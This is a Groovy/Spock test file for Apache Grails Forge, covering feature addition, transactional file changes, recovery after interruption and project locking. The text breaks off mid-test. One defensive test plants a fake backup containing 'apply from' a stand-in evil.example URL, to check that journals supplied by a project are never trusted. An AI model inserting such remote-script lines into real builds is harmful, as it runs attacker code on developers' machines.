/*
 *  Licensed to the Apache Software Foundation (ASF) under one
 *  or more contributor license agreements.  See the NOTICE file
 *  distributed with this work for additional information
 *  regarding copyright ownership.  The ASF licenses this file
 *  to you under the Apache License, Version 2.0 (the
 *  "License"); you may not use this file except in compliance
 *  with the License.  You may obtain a copy of the License at
 *
 *    https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing,
 *  software distributed under the License is distributed on an
 *  "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 *  KIND, either express or implied.  See the License for the
 *  specific language governing permissions and limitations
 *  under the License.
 */
package org.apache.grails.forge.core.change

import java.nio.channels.FileChannel
import java.nio.channels.FileLock
import java.nio.file.FileVisitResult
import java.nio.file.Files
import java.nio.file.LinkOption
import java.nio.file.Path
import java.nio.file.SimpleFileVisitor
import java.nio.file.StandardCopyOption
import java.nio.file.StandardOpenOption
import java.nio.file.attribute.BasicFileAttributes
import java.nio.file.attribute.PosixFilePermissions
import java.security.MessageDigest
import java.util.concurrent.CyclicBarrier
import java.util.concurrent.TimeUnit
import org.apache.grails.forge.core.change.ChangePlan.Action
import org.apache.grails.forge.core.state.ProjectState
import org.grails.forge.ApplicationContextSpec
import org.grails.forge.application.ApplicationType
import org.grails.forge.application.OperatingSystem
import org.grails.forge.application.Project
import org.grails.forge.application.generator.GeneratorContext
import org.grails.forge.application.generator.ProjectGenerator
import org.grails.forge.io.ConsoleOutput
import org.grails.forge.io.FileSystemOutputHandler
import org.grails.forge.io.OutputHandler
import org.grails.forge.options.Options
import org.grails.forge.template.Template
import org.grails.forge.util.NameUtils
import spock.lang.IgnoreIf
import spock.lang.Requires
import spock.lang.TempDir
import spock.lang.Timeout

/**
 * What adding a feature does with files the features of Grails do not write: binary files, files
 * that can be executed, files that are left out; and what becomes of a change that fails or is
 * interrupted. A generator that adds such files to what Quartz writes stands in for a feature that
 * has them.
 */
class FeatureAdditionSpec extends ApplicationContextSpec {

    static final String FEATURE = 'grails-quartz'
    static final byte[] ICON = [0, 1, 2, 3, (byte) 0xff, 0, 7] as byte[]
    static final byte[] OTHER_ICON = [0, 9, 9, 9, (byte) 0xfe, 0, 7] as byte[]
    static final String INTERRUPTED = 'An earlier change of the project was interrupted; it is undone when a feature is added without --dry-run and --diff, ' +
            'and has to be before anything else is done'

    @TempDir
    Path directory

    /** Where the journals of the changes are kept: in a directory of the user, which here is one of the test */
    Path records

    /** The home directory of whoever adds the feature, which here is a directory of the test */
    Path home

    void setup() {
        home = Files.createDirectory(directory.resolve('home'))
        records = home.resolve('.grails/forge/transactions')
    }

    void "a feature is added as if the application had been created with it"() {
        given:
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        Path with = create(generator, 'with', [FEATURE])

        when:
        ChangePlan plan = planOf(generator, project)

        then:
        plan.requested == [FEATURE]
        plan.added.contains(FEATURE)
        plan.conflicts.isEmpty()
        !plan.refused
        plan.files.find { it.path == 'build.gradle' }.action == Action.UPDATE
        plan.files.every { it.action in [Action.ADD, Action.UPDATE] }

        and: 'nothing is written by a plan, in the project or beside it'
        tree(project) != tree(with)
        !Files.exists(project.resolve('.grails/transactions'))
        !Files.exists(home.resolve('.grails'))

        when:
        plan.apply()

        then: 'every file and directory, and the state, is that of the application that was created with the feature'
        tree(project) == tree(with)
        ProjectState.read(project).verifyBaseline(project)

        and: 'nothing is left of the change but the lock'
        left(project) == []
        journals() == []

        when: 'again'
        ChangePlan again = planOf(generator, project)
        again.apply()

        then:
        again.nothingToAdd
        again.alreadyThere == [FEATURE]
        again.files.isEmpty()
        tree(project) == tree(with)
    }

    void "a feature adds a binary file and a file that can be executed"() {
        given:
        ProjectGenerator generator = withNewFiles()
        Path project = create(generator, 'app', [])
        Path with = create(generator, 'with', [FEATURE])

        when:
        ChangePlan plan = planOf(generator, project)
        plan.apply()

        then:
        plan.files.find { it.path == 'src/main/resources/icon.bin' }.action == Action.ADD
        plan.diff().contains('Binary file src/main/resources/icon.bin is added')
        Files.readAllBytes(project.resolve('src/main/resources/icon.bin')) == ICON
        tree(project) == tree(with)

        and:
        ProjectState.read(project).baseline.find('src/main/resources/icon.bin').binary
        ProjectState.read(project).baseline.find('bin/tool.sh').executable
        Files.readAllBytes(project.resolve('.grails/baseline/files/src/main/resources/icon.bin')) == ICON
    }

    @IgnoreIf({ os.windows })
    void "the file a feature adds can be executed when the feature says so, and a file it replaces keeps its mode"() {
        given:
        ProjectGenerator generator = withNewFiles()
        Path project = create(generator, 'app', [])
        Files.setPosixFilePermissions(project.resolve('build.gradle'), PosixFilePermissions.fromString('rw-r-----'))

        when:
        planOf(generator, project).apply()

        then:
        Files.isExecutable(project.resolve('bin/tool.sh'))
        PosixFilePermissions.toString(Files.getPosixFilePermissions(project.resolve('build.gradle'))) == 'rw-r-----'
        project.resolve('build.gradle').toFile().text.contains('grails-quartz')
    }

    void "a binary file a feature changes is replaced when the project has it as it was generated"() {
        given:
        ProjectGenerator generator = changingIcon()
        Path project = create(generator, 'app', [])
        Path with = create(generator, 'with', [FEATURE])

        when:
        ChangePlan plan = planOf(generator, project)
        plan.apply()

        then:
        plan.files.find { it.path == 'icon.bin' }.action == Action.UPDATE
        plan.diff().contains('Binary file icon.bin changes')
        Files.readAllBytes(project.resolve('icon.bin')) == OTHER_ICON
        tree(project) == tree(with)
    }

    void "a binary file that a feature changes and the project changed too is a conflict, and nothing is written"() {
        given:
        ProjectGenerator generator = changingIcon()
        Path project = create(generator, 'app', [])
        Files.write(project.resolve('icon.bin'), [5, 5, 5] as byte[])
        Map<String, String> before = tree(project)

        when:
        ChangePlan plan = planOf(generator, project)

        then:
        plan.conflicts*.path == ['icon.bin']
        plan.conflicts[0].reason == 'the feature changes this binary file, and it was changed in the project too'
        plan.conflicts[0].details == ['Put the file back as it was generated (its copy is .grails/baseline/files/icon.bin), add the feature, and make your change to the new file']
        plan.diff().contains('rejected: icon.bin (the feature changes this binary file, and it was changed in the project too)')

        when:
        plan.apply()

        then:
        thrown(IllegalStateException)
        tree(project) == before
        !Files.exists(project.resolve('.grails/transactions'))
    }

    void "a binary file the project already has as the feature makes it is kept"() {
        given:
        ProjectGenerator generator = changingIcon()
        Path project = create(generator, 'app', [])
        Path with = create(generator, 'with', [FEATURE])
        Files.write(project.resolve('icon.bin'), OTHER_ICON)

        when:
        ChangePlan plan = planOf(generator, project)
        plan.apply()

        then:
        plan.files.find { it.path == 'icon.bin' }.action == Action.ADOPT
        tree(project) == tree(with)
    }

    @IgnoreIf({ os.windows })
    void "a feature that makes a file executable does so, and keeps what the project changed in the file"() {
        given:
        ProjectGenerator generator = generator { GeneratorContext context ->
            context.addTemplate('tool', new Fixed('tool.sh', '#!/bin/sh\necho tool\n'.bytes, false, context.features.contains(FEATURE)))
        }
        Path project = create(generator, 'app', [])
        Files.writeString(project.resolve('tool.sh'), '#!/bin/sh\necho mine\n')

        expect:
        !Files.isExecutable(project.resolve('tool.sh'))

        when:
        ChangePlan plan = planOf(generator, project)
        plan.apply()

        then:
        plan.files.find { it.path == 'tool.sh' }.action == Action.UPDATE
        plan.diff().contains('tool.sh: whether the file can be executed changes')
        Files.isExecutable(project.resolve('tool.sh'))
        project.resolve('tool.sh').toFile().text == '#!/bin/sh\necho mine\n'
        ProjectState.read(project).baseline.find('tool.sh').executable
        ProjectState.read(project).verifyBaseline(project)
    }

    void "a feature that would leave a generated file out is refused, and what it would do is shown"() {
        given:
        ProjectGenerator generator = generator { GeneratorContext context ->
            if (!context.features.contains(FEATURE)) {
                context.addTemplate('only', new Fixed('only-without.txt', 'x\n'.bytes, false, false))
            }
        }
        Path project = create(generator, 'app', [])
        Map<String, String> before = tree(project)

        when:
        ChangePlan plan = planOf(generator, project)

        then:
        plan.refused
        plan.refusal == 'Adding grails-quartz would leave out a file the application was generated with (only-without.txt), which adding a feature does not do. ' +
                'An application has it when it is created with it (--features grails-quartz); to change this application by hand, feature add grails-quartz --diff ' +
                'shows what would be added to its files and what would be removed, and the record under .grails then does not know of the change. Nothing was changed'
        plan.files.find { it.path == 'only-without.txt' }.action == Action.REMOVE
        plan.files.find { it.path == 'build.gradle' }.action == Action.UPDATE

        and:
        List<String> diff = plan.diff()
        diff.containsAll(['--- a/only-without.txt', '+++ /dev/null', '-x'])
        diff.contains('+    implementation "org.apache.grails:grails-quartz"')

        when:
        plan.apply()

        then:
        ProjectChangeException e = thrown()
        e.message == plan.refusal
        tree(project) == before
        !Files.exists(project.resolve('.grails/transactions'))
    }

    void "an application that is not generated again as it was is refused"() {
        given:
        int count = 0
        ProjectGenerator generator = generator { GeneratorContext context ->
            context.addTemplate('count', new Fixed('count.txt', "${++count}\n".toString().bytes, false, false))
        }
        Path project = create(generator, 'app', [])
        Map<String, String> before = tree(project)

        when:
        planOf(generator, project)

        then:
        ProjectChangeException e = thrown()
        e.message.startsWith('The application cannot be generated again as it was: 1 file is not what the baseline of the project has (count.txt).')
        tree(project) == before
    }

    void "a change that is interrupted after any of its files is undone, also when undoing it is interrupted, and one that wrote its last file stays"() {
        given:
        ProjectGenerator generator = withNewFiles()
        Path base = create(generator, 'app', [])
        Path with = create(generator, 'with', [FEATURE])
        Map<String, String> before = tree(base)
        Map<String, String> added = tree(with)
        List<String> writes = []
        planOf(generator, copy(base, 'count')).apply { String path -> writes << path }

        expect: 'files of the application, of which some are new and in new directories, and of the state'
        writes.size() > 10
        writes.containsAll(['build.gradle', 'bin/tool.sh', '.grails/baseline/files/bin/tool.sh', '.grails/baseline/index.yml', '.grails/forge.lock.yml'])
        writes.last() == '.grails/project.yml'

        when:
        List<String> wrong = []
        for (int point = 0; point < writes.size(); point++) {
            Path project = copy(base, "at${point}")
            int written = 0
            try {
                planOf(generator, project).apply { String path ->
                    if (written++ == point) {
                        throw new Stopped()
                    }
                }
                wrong << "${point}: was not interrupted".toString()
            } catch (Stopped ignored) {
            }
            if (journals().size() != 1 || left(project).size() != 1) {
                wrong << "${point}: no journal, or no directory of the change".toString()
            }
            boolean last = point == writes.size() - 1
            try {
                planOf(generator, project)
                // a change that wrote its last file is complete: the project is not half changed
                if (!last) {
                    wrong << "${point}: a plan was made of a project that is half changed".toString()
                }
            } catch (ProjectChangeException e) {
                if (last || e.message != INTERRUPTED) {
                    wrong << "${point}: ${e.message}".toString()
                }
            }
            // the end of the change is itself interrupted, after the first file it puts back
            boolean stopped = false
            try {
                addition(generator).recover(project) { String path ->
                    if (!stopped) {
                        stopped = true
                        throw new Stopped()
                    }
                }
            } catch (Stopped ignored) {
            }
            ProjectRecovery recovery = addition(generator).recover(project)
            if (last ? tree(project) != added : tree(project) != before) {
                wrong << "${point}: the project is not ${last ? 'the one with the feature' : 'as it was'}: ${differing(tree(project), last ? added : before)}".toString()
            }
            if (left(project) != [] || journals() != [] || addition(generator).recover(project).with { it.undone || it.completed }) {
                wrong << "${point}: something is left of the change".toString()
            }
            if (!last && stopped && !recovery.undone && !recovery.discarded) {
                wrong << "${point}: the second recovery did not say that it undid the change".toString()
            }
            ProjectState.read(project).verifyBaseline(project)
            planOf(generator, project).apply()
            if (tree(project) != added) {
                wrong << "${point}: adding the feature afterwards gives another project".toString()
            }
        }

        then:
        wrong == []
    }

    void "what was undone is said, file by file, and a change that had written everything is said to be complete"() {
        given:
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        Path with = create(generator, 'with', [FEATURE])
        Map<String, String> before = tree(project)

        when:
        try {
            planOf(generator, project).apply { String path ->
                if (path == 'build.gradle') {
                    throw new Stopped()
                }
            }
        } catch (Stopped ignored) {
        }
        List<String> told = []
        ProjectRecovery recovery = addition(generator).recover(project) { String path -> told << path }

        then:
        recovery.undone
        !recovery.completed
        recovery.putBack == ['README.md', 'build.gradle']
        told == ['build.gradle', 'README.md']
        recovery.messages == ['An earlier change of the application that was interrupted was undone. 2 files were put back as they were: README.md, build.gradle']
        tree(project) == before

        when: 'nothing was interrupted'
        ProjectRecovery none = addition(generator).recover(project)

        then:
        !none.undone
        !none.completed
        none.messages == []

        when: 'the program ends after the last file and before the journal is removed'
        try {
            planOf(generator, project).apply { String path ->
                if (path == ProjectState.MANIFEST) {
                    throw new Stopped()
                }
            }
        } catch (Stopped ignored) {
        }
        ProjectRecovery complete = addition(generator).recover(project) { String path -> told << path }

        then:
        complete.completed
        !complete.undone
        complete.putBack == []
        told.size() == 2
        complete.messages == ['An earlier change of the application was interrupted, and every file is what that change makes of it: it is complete, and was ended now']
        tree(project) == tree(with)
        left(project) == []
        journals() == []
    }

    void "a file the change wrote that was changed after the interruption stops the undoing, and nothing is put back"() {
        given:
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        Map<String, String> before = tree(project)
        List<String> written = []
        try {
            planOf(generator, project).apply { String path ->
                written << path
                if (path == ProjectState.BASELINE_INDEX) {
                    throw new Stopped()
                }
            }
        } catch (Stopped ignored) {
        }
        byte[] asWritten = Files.readAllBytes(project.resolve('build.gradle'))
        project.resolve('build.gradle').toFile() << '// written by an editor meanwhile\n'
        Map<String, String> interrupted = tree(project)
        String change = left(project).first()

        when:
        addition(generator).recover(project)

        then:
        ProjectChangeException e = thrown()
        e.message.startsWith('A file of a change that was interrupted is neither what it was before the change nor what the change makes of it: build.gradle. ' +
                "Nothing was put back. Make it what it was before the change (the files that were replaced are kept in .grails/transactions/${change}/backup, " +
                'and a file that was new is to be removed), or what the change makes of it, and run the command again; ' +
                'or restore the project from version control and remove the file journal from the directory ')

        and: 'not one file'
        tree(project) == interrupted

        when: 'the file is made what the change wrote'
        Files.write(project.resolve('build.gradle'), asWritten)
        ProjectRecovery recovery = addition(generator).recover(project)

        then:
        recovery.undone
        tree(project) == before
        left(project) == []

        when: 'again, and this time the file is put back from the copy that was kept'
        written.clear()
        try {
            planOf(generator, project).apply { String path ->
                written << path
                if (path == ProjectState.BASELINE_INDEX) {
                    throw new Stopped()
                }
            }
        } catch (Stopped ignored) {
        }
        project.resolve('build.gradle').toFile() << '// written by an editor meanwhile\n'
        Files.copy(project.resolve(".grails/transactions/${left(project).first()}/backup/${written.indexOf('build.gradle')}"), project.resolve('build.gradle'),
                StandardCopyOption.REPLACE_EXISTING)

        then:
        addition(generator).recover(project).undone
        tree(project) == before
    }

    void "a file the change has not come to that is changed meanwhile ends the change, and is left with what was changed in it"() {
        given:
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        Map<String, String> before = tree(project)

        when: 'an editor writes the configuration after the change replaced the build file'
        planOf(generator, project).apply { String path ->
            if (path == 'build.gradle') {
                project.resolve('grails-app/conf/application.yml').toFile() << 'mine: true\n'
            }
        }

        then:
        ProjectChangeException e = thrown()
        e.message == 'grails-app/conf/application.yml was changed while the project was being changed; nothing was added, and the project is as it was before, ' +
                'with what was changed in grails-app/conf/application.yml meanwhile'

        and: 'the project is as it was, with the change of the editor, and nothing is in the way of the next command'
        differing(tree(project), before) == ['grails-app/conf/application.yml']
        project.resolve('grails-app/conf/application.yml').toFile().text.endsWith('mine: true\n')
        left(project) == []
        journals() == []

        expect:
        planOf(generator, project).files.find { it.path == 'grails-app/conf/application.yml' }.action in [Action.MERGE, Action.CONFLICT]
    }

    void "a file the interrupted change had not come to that was changed since stops the undoing too, until it is what it was"() {
        given:
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        Map<String, String> before = tree(project)
        try {
            planOf(generator, project).apply { String path ->
                if (path == 'build.gradle') {
                    throw new Stopped()
                }
            }
        } catch (Stopped ignored) {
        }
        byte[] configuration = Files.readAllBytes(project.resolve('grails-app/conf/application.yml'))
        project.resolve('grails-app/conf/application.yml').toFile() << 'mine: true\n'
        Map<String, String> interrupted = tree(project)

        when: 'what is left of a change in its directory does not say which files it wrote: only what the files are does'
        addition(generator).recover(project)

        then:
        ProjectChangeException e = thrown()
        e.message.startsWith('A file of a change that was interrupted is neither what it was before the change nor what the change makes of it: ' +
                'grails-app/conf/application.yml. Nothing was put back.')
        tree(project) == interrupted

        when:
        Files.write(project.resolve('grails-app/conf/application.yml'), configuration)
        ProjectRecovery recovery = addition(generator).recover(project)

        then:
        recovery.undone
        recovery.putBack == ['README.md', 'build.gradle']
        tree(project) == before
        left(project) == []
    }

    void "a change that was halted before its state and completed under another home directory is complete, and nothing of it is put back"() {
        given:
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        Path with = create(generator, 'with', [FEATURE])
        Path otherHome = Files.createDirectory(directory.resolve('other-home'))

        when: 'the change ends after the files of the application and before those of the state'
        try {
            planOf(generator, project).apply { String path ->
                if (path == 'grails-forge-cli.yml') {
                    throw new Stopped()
                }
            }
        } catch (Stopped ignored) {
        }

        then:
        project.resolve('build.gradle').toFile().text.contains('grails-quartz')
        !ProjectState.read(project).lock.featureNames.contains(FEATURE)

        when: 'under another home directory there is no journal: the feature is added, to files that have it already'
        FeatureAddition elsewhere = new FeatureAddition(generator, otherHome)
        ProjectRecovery none = elsewhere.recover(project)
        ChangePlan again = elsewhere.plan(project, [FEATURE], OperatingSystem.LINUX, ConsoleOutput.NOOP)
        again.apply()

        then:
        !none.undone
        none.strangers.size() == 1
        none.messages[0].contains('it holds the copies of a change that was begun under another home directory or path and not ended; ' +
                'remove it only when the application is as it is to be')
        again.files.findAll { it.path in ['build.gradle', 'README.md'] }*.action == [Action.ADOPT, Action.ADOPT]
        ProjectState.read(project).lock.featureNames.contains(FEATURE)

        when: 'and then the first home directory finds its journal'
        ChangePlan preview = planOf(generator, project)
        ProjectRecovery recovery = addition(generator).recover(project)

        then: 'every file is what that change makes of it: it is complete'
        preview.nothingToAdd
        recovery.completed
        !recovery.undone
        recovery.putBack == []
        tree(project) == tree(with)
        ProjectState.read(project).verifyBaseline(project)
        left(project) == []
        journals() == []
    }

    void "a journal for a tree that is as it was before the change is in the way of nothing, and is removed"() {
        given:
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        Path pristine = copy(project, 'pristine')
        Path with = create(generator, 'with', [FEATURE])
        Map<String, String> before = tree(project)
        try {
            planOf(generator, project).apply { String path ->
                if (path == 'build.gradle') {
                    throw new Stopped()
                }
            }
        } catch (Stopped ignored) {
        }

        when: 'the files are put back by other means, as a fresh checkout at the same path does'
        ['README.md', 'build.gradle'].each { Files.copy(pristine.resolve(it), project.resolve(it), StandardCopyOption.REPLACE_EXISTING) }

        then: 'a plan is made, as for --dry-run and --diff'
        planOf(generator, project).requested == [FEATURE]

        when:
        ProjectRecovery recovery = addition(generator).recover(project)

        then:
        recovery.discarded
        !recovery.undone
        !recovery.completed
        recovery.messages == ['The record of an earlier change was removed: no file of the application is other than it was before that change']
        tree(project) == before
        left(project) == []
        journals() == []

        when: 'a record of a change that had not begun to write'
        Path of = Files.createDirectories(records.resolve(sha(project.toRealPath().toString().getBytes('UTF-8'))))
        Files.writeString(of.resolve('journal'), "grails-forge-transaction 3\nproject ${Base64.urlEncoder.withoutPadding().encodeToString(project.toRealPath().toString().getBytes('UTF-8'))}\n" +
                'id t0123456789abcdef01234567\nstaging\n')

        then:
        planOf(generator, project).requested == [FEATURE]
        addition(generator).recover(project).discarded
        journals() == []

        when:
        planOf(generator, project).apply()

        then:
        tree(project) == tree(with)
    }

    void "a home directory that is none keeps no record, and nothing is looked for or changed with it"() {
        given:
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        Map<String, String> before = tree(project)
        FeatureAddition addition = new FeatureAddition(generator, where)

        when: 'what would be done can be seen'
        ChangePlan plan = addition.plan(project, [FEATURE], OperatingSystem.LINUX, ConsoleOutput.NOOP)

        then:
        plan.requested == [FEATURE]

        when:
        plan.apply()

        then:
        ProjectChangeException e = thrown()
        e.message == 'Adding a feature needs a home directory to keep the record of the change in, and the one the system property user.home names cannot be used: ' +
                "${reason}. Nothing of the project was changed"
        tree(project) == before
        !Files.exists(project.resolve('.grails/transactions'))

        when:
        addition.recover(project)

        then:
        ProjectChangeException again = thrown()
        again.message == e.message
        tree(project) == before

        where:
        where                                    || reason
        Path.of('?')                             || 'it is not an absolute path'
        Path.of('')                              || 'it is not an absolute path'
        Path.of('/no/such/home/directory/there') || 'there is no such directory'
    }

    @IgnoreIf({ os.windows })
    void "a home directory that is the project, is in it or is a link to it keeps no record: a project could bring one along"() {
        given: 'a project that has, where its own directory would keep the journals, a journal that names its build file, and a copy to put in its place'
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        Path inside = Files.createDirectories(project.resolve('tools/home'))
        Path link = Files.createSymbolicLink(directory.resolve('link-to-the-project'), project)
        String path = Base64.urlEncoder.withoutPadding().encodeToString(project.toRealPath().toString().getBytes('UTF-8'))
        byte[] evil = 'apply from: "https://evil.example/build.gradle"\n'.getBytes('UTF-8')
        [project, inside].each { Path where ->
            Path of = Files.createDirectories(where.resolve('.grails/forge/transactions').resolve(sha(project.toRealPath().toString().getBytes('UTF-8'))))
            Files.writeString(of.resolve('journal'), "grails-forge-transaction 3\nproject ${path}\nid t0123456789abcdef01234567\n" +
                    "put 0 ${sha(evil)} ${sha(project.resolve('build.gradle'))} build.gradle\nend\n")
        }
        Files.createDirectories(project.resolve('.grails/transactions/t0123456789abcdef01234567/backup'))
        Files.write(project.resolve('.grails/transactions/t0123456789abcdef01234567/backup/0'), evil)
        Map<String, String> before = tree(project)

        when:
        new FeatureAddition(generator, chosen.call(project, inside, link)).recover(project)

        then:
        ProjectChangeException e = thrown()
        e.message == 'Adding a feature needs a home directory to keep the record of the change in, and the one the system property user.home names cannot be used: ' +
                'it is the directory of the project, or a directory in it, or a link to one, and the record of a change must not be where a project could bring one along. ' +
                'Nothing of the project was changed'
        tree(project) == before

        when: 'what would be done is still worked out, and nothing of the journal is read for it'
        ChangePlan plan = new FeatureAddition(generator, chosen.call(project, inside, link)).plan(project, [FEATURE], OperatingSystem.LINUX, ConsoleOutput.NOOP)

        then:
        plan.requested == [FEATURE]

        when:
        plan.apply()

        then:
        ProjectChangeException again = thrown()
        again.message == e.message
        tree(project) == before

        where:
        what                     | chosen
        'the project'            | { Path itself, Path within, Path linked -> itself }
        'a directory in it'      | { Path itself, Path within, Path linked -> within }
        'a link to the project'  | { Path itself, Path within, Path linked -> linked }
        'a directory by a link'  | { Path itself, Path within, Path linked -> linked.resolve('tools/home') }
    }

    @IgnoreIf({ os.windows })
    void "a file of which a change only changes the mode is put back when its mode was changed, and not said to be when it was not"() {
        given:
        ProjectGenerator generator = generator { GeneratorContext context ->
            context.addTemplate('tool', new Fixed('tool.sh', '#!/bin/sh\necho tool\n'.bytes, false, context.features.contains(FEATURE)))
        }
        Path project = create(generator, 'app', [])
        Path pristine = copy(project, 'pristine')
        Map<String, String> before = tree(project)

        when: 'the change ends after its first file, which is then put back by hand: the mode of the script was not changed'
        try {
            planOf(generator, project).apply { String path ->
                if (path == 'README.md') {
                    throw new Stopped()
                }
            }
        } catch (Stopped ignored) {
        }
        Files.copy(pristine.resolve('README.md'), project.resolve('README.md'), StandardCopyOption.REPLACE_EXISTING)
        ProjectRecovery recovery = addition(generator).recover(project)

        then:
        recovery.discarded
        !recovery.undone
        recovery.putBack == []
        tree(project) == before
        left(project) == []

        when: 'the change ends after it made the script executable'
        try {
            planOf(generator, project).apply { String path ->
                if (path == 'tool.sh') {
                    throw new Stopped()
                }
            }
        } catch (Stopped ignored) {
        }

        then:
        Files.isExecutable(project.resolve('tool.sh'))

        when:
        recovery = addition(generator).recover(project)

        then:
        recovery.undone
        recovery.putBack.contains('tool.sh')
        !Files.isExecutable(project.resolve('tool.sh'))
        tree(project) == before
    }

    void "the directories a change made are removed with its journal when its files were removed by other means"() {
        given:
        ProjectGenerator generator = withNewFiles()
        Path project = create(generator, 'app', [])
        Path pristine = copy(project, 'pristine')
        Map<String, String> before = tree(project)
        try {
            planOf(generator, project).apply { String path ->
                if (path == 'bin/tool.sh') {
                    throw new Stopped()
                }
            }
        } catch (Stopped ignored) {
        }

        expect:
        Files.isDirectory(project.resolve('bin'))

        when: 'the files are what they were, and the directory of the new file is left empty'
        Files.copy(pristine.resolve('README.md'), project.resolve('README.md'), StandardCopyOption.REPLACE_EXISTING)
        Files.delete(project.resolve('bin/tool.sh'))
        ProjectRecovery recovery = addition(generator).recover(project)

        then:
        recovery.discarded
        !Files.exists(project.resolve('bin'))
        tree(project) == before
        left(project) == []
        journals() == []
    }

    @IgnoreIf({ os.windows })
    void "a directory on the way to the journals that others can write, or that is a link, is not used"() {
        given:
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        Map<String, String> before = tree(project)
        Files.createDirectories(home.resolve('.grails/forge'))
        Files.setPosixFilePermissions(home.resolve(level), PosixFilePermissions.fromString('rwxrwxrwx'))

        when:
        planOf(generator, project)

        then:
        ProjectChangeException e = thrown()
        e.message == 'The directory the records of changes are kept in, .grails/forge/transactions in the home directory of the user, cannot be used: ' +
                "${level} can be written by others than the user. Nothing of the project was changed"

        when:
        addition(generator).recover(project)

        then:
        thrown(ProjectChangeException)
        tree(project) == before

        when: 'a link in the place of the directory'
        Files.setPosixFilePermissions(home.resolve(level), PosixFilePermissions.fromString('rwx------'))
        Path elsewhere = Files.createDirectory(directory.resolve("elsewhere-${level.replace('/', '-')}"))
        Files.delete(home.resolve('.grails/forge'))
        Files.createSymbolicLink(home.resolve('.grails/forge'), elsewhere)
        planOf(generator, project).apply()

        then:
        ProjectChangeException linked = thrown()
        linked.message.contains('.grails/forge is not a directory')
        tree(project) == before
        elsewhere.toFile().list().length == 0

        where:
        level << ['.grails', '.grails/forge']
    }

    @IgnoreIf({ os.windows })
    void "a change of a project whose path has a character that ends a line is undone like any other"() {
        given:
        ProjectGenerator generator = generator()
        Path project = create(generator, name, [])
        Map<String, String> before = tree(project)
        try {
            planOf(generator, project).apply { String path ->
                if (path == 'build.gradle') {
                    throw new Stopped()
                }
            }
        } catch (Stopped ignored) {
        }

        expect:
        tree(project) != before

        when:
        ProjectRecovery recovery = addition(generator).recover(project)

        then:
        recovery.undone
        tree(project) == before
        journals() == []

        where:
        name << ['a line\nfeed', 'a carriage\rreturn', 'a line\u2028separator', 'a next\u0085line']
    }

    @Timeout(value = 300, unit = TimeUnit.SECONDS)
    void "many lines added to a file in one place are merged and shown without more work than the lines are"() {
        given:
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        project.resolve('build.gradle').toFile().text = (0..<150000).collect { "// line ${it} of the project" }.join('\n') + '\n' + project.resolve('build.gradle').toFile().text

        when:
        ChangePlan plan = planOf(generator, project)
        List<String> diff = plan.diff()

        then:
        plan.files.find { it.path == 'build.gradle' }.action == Action.MERGE
        diff.contains('+    implementation "org.apache.grails:grails-quartz"')
        diff.size() < 200
    }

    @IgnoreIf({ os.windows || System.getProperty('user.name') == 'root' })
    void "when a file cannot be written, the files that were written are put back"() {
        given:
        ProjectGenerator generator = generator { GeneratorContext context ->
            if (context.features.contains(FEATURE)) {
                context.addTemplate('new', new Fixed('sealed/new.txt', 'new\n'.bytes, false, false))
            }
        }
        Path project = create(generator, 'app', [])
        Path sealed = Files.createDirectory(project.resolve('sealed'))
        Files.setPosixFilePermissions(sealed, PosixFilePermissions.fromString('r-xr-xr-x'))
        Map<String, String> before = tree(project)
        ChangePlan plan = planOf(generator, project)
        List<String> written = []

        when:
        plan.apply { String path -> written << path }

        then:
        ProjectChangeException e = thrown()
        e.message == 'sealed/new.txt could not be written (AccessDeniedException); nothing was added, and the project is as it was before'
        written.contains('build.gradle')
        tree(project) == before
        left(project) == []
        journals() == []
        ProjectState.read(project).verifyBaseline(project)

        cleanup:
        Files.setPosixFilePermissions(sealed, PosixFilePermissions.fromString('rwxr-xr-x'))
    }

    void "a file that is changed between the plan and its application stops the change before anything is written"() {
        given:
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        ChangePlan plan = planOf(generator, project)
        project.resolve('build.gradle').toFile() << '// written by an editor meanwhile\n'
        Map<String, String> before = tree(project)

        when:
        plan.apply()

        then:
        ProjectChangeException e = thrown()
        e.message == 'build.gradle was changed while the change of the project was being prepared; nothing of the project was changed'
        tree(project) == before
        left(project) == []
        journals() == []
    }

    void "one command changes a project at a time"() {
        given:
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        ChangePlan plan = planOf(generator, project)
        Map<String, String> before = tree(project)
        Files.createDirectories(project.resolve('.grails/transactions'))
        FileChannel channel = FileChannel.open(project.resolve('.grails/transactions/lock'), StandardOpenOption.CREATE, StandardOpenOption.WRITE)
        FileLock lock = channel.lock()

        when:
        plan.apply()

        then:
        ProjectChangeException e = thrown()
        e.message == 'Another command is changing the project; nothing was changed by this one. Run it again when the other has ended'
        tree(project) == before

        when:
        lock.release()
        plan.apply()

        then:
        tree(project) != before

        cleanup:
        channel?.close()
    }

    @Timeout(value = 900, unit = TimeUnit.SECONDS)
    void "of two changes that begin at once one is made, and the other is told that the project is being changed or was"() {
        given:
        ProjectGenerator generator = generator()
        Path base = create(generator, 'app', [])
        List<String> outcomes = []

        when:
        for (int round = 0; round < 3; round++) {
            Path project = copy(base, "round${round}")
            List<ChangePlan> plans = [planOf(generator, project), planOf(generator, project, ['asciidoctor'])]
            CyclicBarrier together = new CyclicBarrier(2)
            List<String> said = Collections.synchronizedList([])
            List<Thread> threads = plans.collect { ChangePlan each ->
                Thread.start {
                    together.await(300, TimeUnit.SECONDS)
                    try {
                        each.apply()
                        said << 'made'
                    } catch (ProjectChangeException e) {
                        said << e.message
                    }
                }
            }
            threads*.join(600000)
            outcomes.addAll(said.findAll { it != 'made' })
            assert said.count('made') == 1
            assert left(project) == []
            ProjectState.read(project).verifyBaseline(project)
        }

        then:
        outcomes.size() == 3
        outcomes.every {
            it == 'Another command is changing the project; nothing was changed by this one. Run it again when the other has ended' ||
